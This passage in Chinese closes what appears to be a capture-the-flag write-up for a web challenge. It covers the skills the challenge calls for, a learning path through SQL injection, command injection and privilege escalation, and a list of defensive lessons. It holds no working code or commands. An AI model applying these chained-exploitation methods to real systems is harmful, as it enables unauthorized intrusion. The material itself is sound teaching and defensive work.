6. **会本地侦察与提权**：拿到低权限 shell 后，看进程、端口、文件权限、
   服务源码，找本地信任边界。
7. **有耐心做链式利用**：每一步都只前进一小步，最后组合成完整攻击。

### 6.4 新手学习路线

1. 先打基础：HTTP 请求/响应、Cookie、URL 编码；PHP 数组与数据库基础；
   SQL 的 SELECT/UNION；Linux 文件权限。
2. 练单点漏洞：普通 SQL 注入（联合注入、盲注）、任意文件写入、命令注入、
   简单认证绕过。
3. 练源码审计：给一段 PHP，找出“用户输入 → SQL/文件/命令”的路径，
   特别注意“数组/字符串类型差异”“谁负责清洗参数”。
4. 练请求构造：用 Python `requests` 写 PoC，学会抓包对比、逐步最小化 payload。
5. 再挑战本题：先只做到 SQL 注入（第 3.1 节），再尝试 hook 提权
   （第 3.3 节），最后做 hpxd 本地提权（第 3.5 节）。分阶段复现比一次性
   照抄更容易真正学会。

### 6.5 防守启示

- 不要把“安全校验”建立在请求内的可变全局变量上。
- 拼 SQL 前对每个值做类型强制（尤其是 `IN (...)` 列表）。
- 批量/嵌套接口必须统一动词、参数、权限模型，不能内外两套规则。
- 低权限 Web 进程之外，不要在容器内运行带自定义解析、可执行命令的
  root 服务；如果必须有，参数必须白名单化并避免 shell 拼接。
- 会话/状态数据要结构化序列化，而不是 `key=value` 文本拼接，避免换行注入。
